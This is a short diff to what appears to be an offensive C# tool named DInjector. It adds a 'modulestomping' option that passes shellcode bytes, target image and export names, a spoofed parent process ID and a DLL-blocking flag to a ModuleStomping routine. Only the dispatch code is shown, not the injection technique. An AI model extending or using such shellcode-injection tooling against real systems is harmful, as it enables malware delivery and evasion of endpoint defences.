@@ -162,6 +162,15 @@ namespace DInjector
                         ppid,
                         blockDlls);
                     break;
+                case "modulestomping":
+                    ModuleStomping.Execute(
+                        shellcodeBytes,
+                        options["/image"],
+                        options["/stomp"],
+                        options["/export"],
+                        ppid,
+                        blockDlls);
+                    break;
             }
         }
     }
